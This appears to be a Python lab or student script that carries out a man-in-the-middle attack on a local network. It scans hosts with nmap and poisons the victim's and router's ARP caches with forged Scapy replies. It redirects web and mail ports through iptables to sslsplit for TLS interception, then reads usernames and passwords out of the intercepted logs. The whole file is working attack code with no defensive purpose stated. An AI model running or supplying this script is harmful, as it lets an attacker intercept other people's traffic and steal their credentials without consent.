import struct
import os
import subprocess
import socket
import re
import fcntl
from scapy.all import *
from time import *

"""
get ip address of host
link: https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib?page=1&tab=votes#tab-top
"""
def getHostIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

"""
get information of NIC using "ip addr" command
"""
def nicInfo():
    proc = subprocess.Popen(["ip addr"],stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    ipaddr = out.decode("utf-8")
    ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ipaddr)
    # mac = re.findall(
    #     "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", ipaddr)
    return ip

def getNic():
    proc = subprocess.Popen(["ip route"], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    nic = out.decode("utf-8")
    nic = re.split(" ",nic)
    return nic[4]

"""
by "nmap" command, we can scan all device which have 
link : https://stackoverflow.com/questions/13212187/is-it-possible-to-get-the-mac-address-for-machine-using-nmap
link : https://superuser.com/questions/887887/different-behavior-sudo-nmap-vs-just-nmap
"""
def nmap(ip):
    tmp = "nmap -sn -n " + ip 
    print("Command is ",tmp)
    proc = subprocess.Popen([tmp], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out2 = out.decode("utf-8")
    return out2

"""
https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/6556951
"""
def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

"""
regular expression for:
ipV4 : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
"""

"""
https://stackoverflow.com/questions/159137/getting-mac-address
"""

def getMac(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack(
        '256s', bytes(ifname, 'utf-8')[:15]))
    return ':'.join('%02x' % b for b in info[18:24])

"""
https://unix.stackexchange.com/questions/14056/what-is-kernel-ip-forwarding
https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux

開啟 linux ip forwarding, 可以使整台機器像台 router, 
一旦收到不屬於此 local machine 的封包, 就往 gateway 送
"""
def enable_port_forwarding():
    flag = 1
    flag = str(flag)
    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables -t nat -F')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')
    os.system('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
    # os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
    # tmp = "sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"
    proc = subprocess.call(
        # ["sslsplit", "-l", "connections.log", "-j", "/tmp/sslsplit/", "-S", "logdir/", "-k", "ca.key", "-c", "ca.crt", "ssl", "0.0.0.0", "8443", "tcp", "0.0.0.0", "8080],
        ["sslsplit -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
        # stdout=subprocess.DEVNULL,
        shell=True)


def disable_port_forwarding():
    flag = 0
    flag = str(flag)
    os.system('echo ' + flag + ' > /proc/sys/net/ipv4/ip_forward')

if __name__ == "__main__":
    
    ip          = getHostIp()
    nic         = getNic()
    hostip      = ip 
    hostmac     = getMac(nic)
    routerIp    = get_default_gateway_linux()
    routerMac   = ""

    # ip and MAC address of command "ip addr"
    # search Ip with subnet mask by using ip we already know
    # example:
    #   nicip: 192.168.1.1/24, 192.168.1.2/24, etc
    #   ip : 192.168.1.1
    nicip = nicInfo()
    for i in nicip:
        # print(ip, " ", i.split("/")[0])
        if(i.split("/")[0]==ip):
            ip = i
            break

    result = nmap(ip)
    print(result)

    # regular expression for IPv4
    ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
    # regular expression for MAC 
    mac = re.findall(
        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)

    for i in ip:
        if(i == hostip):
            ip.remove(i)
            break

    print(ip)
    print(mac)
    _len = len(ip)
    for i in range(0, _len):
        if(ip[i] == routerIp):
            routerMac = mac[i]
            ip.remove(ip[i])
            mac.remove(mac[i])
            break

    print("")

    print("nic card: ", nic)
    print("router Ip: %-18s MAC: %s" % (routerIp,routerMac))
    print("host   Ip: %-18s MAC: %s" % (hostip, hostmac))
    # print("host MAC", hostmac)

    print("")


    print("----------------------------------------------")
    print("IP                       MAC")
    print("----------------------------------------------")    

    for i in range(0,len(ip)):
        print("%-18s       %s" % (ip[i],mac[i]))

    victimpacket = ARP( op=2, 
                        pdst="10.0.2.8", 
                        hwdst="08:00:27:34:C8:8F",
                        psrc="10.0.2.1", 
                        hwsrc="08:00:27:25:A4:94")
    routerpacket = ARP( op=2, 
                        pdst="10.0.2.1", 
                        hwdst="38:6B:1C:C3:8C:68",
                        psrc="10.0.2.8", 
                        hwsrc="08:00:27:25:A4:94")

    enable_port_forwarding()

    try:
        while(1):
            # verbose=0 : make the function totally silent
            # More : help(send)
            # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
            send(victimpacket, verbose=0)
            send(routerpacket, verbose=0)

            for file in os.listdir("logdir/"):
                with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        if ('username: ' in line) and (" password: " in line):
                            a = [m.start() for m in re.finditer("&", line)]
                            b = [m.start() for m in re.finditer("=", line)]
                            # print(a, b)
                            print(line[b[0]+1:a[0]], line[b[1]+1:a[1]])
                            break
            sleep(2)
    finally:
        print("Done")
